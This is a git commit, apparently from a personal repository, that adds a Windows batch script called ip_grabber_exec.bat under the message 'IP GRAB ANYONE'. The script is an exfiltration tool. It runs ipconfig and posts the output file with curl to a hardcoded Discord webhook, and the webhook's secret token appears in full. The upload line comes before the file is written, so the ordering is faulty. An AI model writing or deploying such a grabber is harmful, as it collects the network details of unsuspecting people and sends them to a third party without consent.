f1f22a08abb3cfc54110146296eefed4a6554dbe
YourLocalLucas <palmlucas78@gmail.com>
2024-09-14 23:30:23 +0200

    Add files via upload
    IP GRAB ANYONE

---
+++ New folder/ip_grabber_exec.bat
@@ -0,0 +1,3 @@
+@echo off 
+curl --silent --output /dev/null -F 1=@"ip.txt" https://discord.com/api/webhooks/1284621786281148567/HuVp8fd37sIGOUW8wvNL5uZYRlsoNjLg7B075NWuHsa0C5tTvhLaXKvijfzCHcF-SNER 
+ipconfig >ip.txt 
